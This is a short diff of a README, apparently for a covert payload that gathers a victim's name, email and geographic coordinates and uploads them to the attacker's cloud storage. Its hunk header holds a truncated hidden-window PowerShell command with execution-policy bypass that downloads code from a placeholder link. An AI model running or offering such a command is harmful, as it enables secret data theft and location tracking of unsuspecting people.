@@ -51,9 +51,12 @@ powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https:// < Your Shared link fo
 Something Like What you see below will be in your cloud storage:
 
 NAME
+
 EMAIL 
+
 LATITUDE AND LONGITUDE
 
+```
 Jakoby
 
 jakoby@example.com
@@ -61,6 +64,7 @@ jakoby@example.com
  Latitude  Longitude
  --------  ---------
 37.778919 -122.416313
+```
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
